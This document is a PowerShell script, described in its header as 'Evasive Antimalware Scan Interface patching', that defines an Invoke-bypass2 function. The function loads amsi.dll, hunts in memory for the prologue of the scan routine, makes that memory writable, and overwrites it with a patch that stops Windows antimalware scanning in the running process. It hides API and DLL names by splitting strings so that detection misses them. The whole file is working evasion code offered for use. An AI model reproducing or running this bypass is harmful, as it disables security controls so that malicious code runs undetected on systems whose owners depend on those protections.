<#

.DESCRIPTION
Evasive Antimalware Scan Interface patching
 
.EXAMPLE
Invoke-bypass2
 
#>

$K2 = @"

using System;
using System.Runtime.InteropServices;

public class K2 {

    [DllImport("kernel32",EntryPoint="Get"+"Proc"+"Address")]
    public static extern IntPtr gpa(IntPtr hModule, string procName);

    [DllImport("kernel32",EntryPoint="Load"+"Library")]
    public static extern IntPtr ll(string name);

    [DllImport("kernel32",EntryPoint="Virtual"+"Protect")]
    public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	public static void Copy(Byte[] source, Int32 startIndex, Int"+"Ptr destination, Int32 length)
	{ Mar"+"shal.Copy(source, startIndex, destination, length);}
}
"@

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

If ([IntPtr]::Size -eq 8) {
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}

function Invoke-bypass2 {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= ''
    )
    Begin {
		Add-Type $K2
    }

    Process {
		$hModule = [K2]::ll("am" + "si.dll")
		$dllCanUnloadNowAddress = [K2]::gpa($hModule, "Dll"+"Can"+"Unload"+"Now")
		[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
		$p = 0
		[K2]::vp($targetedAddress, [uint32]2, 0x40, [ref]$p) | Out-Null
		$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3,0xC3)		
		[K2]::Copy($Patch, 0, $targetedAddress, 7)

    }
}